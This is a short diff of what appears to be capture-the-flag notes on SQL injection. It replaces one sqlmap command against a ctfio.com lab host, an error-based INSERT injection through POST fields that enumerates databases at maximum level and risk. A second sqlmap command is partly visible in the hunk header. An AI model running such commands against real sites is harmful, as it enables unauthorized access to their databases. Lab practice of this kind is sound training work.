@@ -36,6 +36,6 @@ sqlmap -u "https://64cul97j.eu1.ctfio.com/?email=test" --level 5 --risk 3 -p ema
 # ERROR based INSERT
 
 ```bash
-sqlmap -u "https://tfe6gbl8.eu1.ctfio.com/" --data='title=test&comment=test' --method POST --level 5 --risk 3 -p title --batch --threads 10 --dbms=mysql --dbs
+sqlmap -u "https://gley1x8x.eu1.ctfio.com/" --data='title=test&comment=test' --method POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dbs
 ```
 
